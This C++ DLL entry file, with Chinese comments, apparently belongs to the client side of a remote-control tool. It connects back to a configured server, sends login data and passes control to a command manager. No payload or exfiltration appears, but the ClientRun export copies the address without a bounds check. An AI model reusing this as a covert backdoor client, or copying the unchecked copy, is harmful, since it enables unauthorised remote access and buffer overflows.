// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include"dllmain.h"
char __ServerAddress[MAX_PATH] = { 0 };
unsigned short __ConnectPort = 0;
HINSTANCE __InstanceHandle = NULL;
DWORD WINAPI WorkThreadProcedure(LPVOID ParameterData)
{
    //启动一个客户端的通信类
    CIocpClient IocpClient;   //构造函数
    BOOL IsOk = FALSE;
    while (1)
    {
        if (IsOk == TRUE)
        {
            break;
        }
        DWORD TickCount = GetTickCount();

        if (!IocpClient.ConnectServer(__ServerAddress, __ConnectPort))
        {
            //和服务器进行链接  启动一个线程(服务端向客户端发数据)   选择模型
            continue;
        }



        SendLoginInformation(&IocpClient, GetTickCount() - TickCount);    //发送第一波数据 滴答数 测试程序的网络连接效率(链接所需要的时间）

        //构建接收数据的机制
        CKernelManager	KernelManager(&IocpClient);   //负责通信的   CKernelManager是抽象类Manager的第一个派生类

        //下线
        //其他功能的创建
        //
        do
        {

            //等待一个事件
            int Index = WaitForSingleObject(IocpClient.m_EventHandle, 100);       //当服务器关闭了客户端使事件授信，则返回值Index为0

            if (Index == 0)   //事件授信的话返回值就是0
            {
                break;
            }
            else
            {
                continue;
            }

        } while (1);

        //退出整个循环
        IsOk = TRUE;
    }

    return 0;
        
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        __InstanceHandle = (HINSTANCE)hModule;
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

//导出函数
void ClientRun(char* ServerAddress, USHORT ConnectPort)
{
    memcpy(__ServerAddress, ServerAddress, strlen(ServerAddress));
    __ConnectPort = ConnectPort;

    //启动一个工作线程
    HANDLE ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThreadProcedure, NULL, 0, NULL);

    //等待工作线程的正常退出
    WaitForSingleObject(ThreadHandle, INFINITE);
    _tprintf(_T("Client Bye Bye!!!\r\n"));
    if (ThreadHandle != NULL)
    {
        CloseHandle(ThreadHandle);
    }
}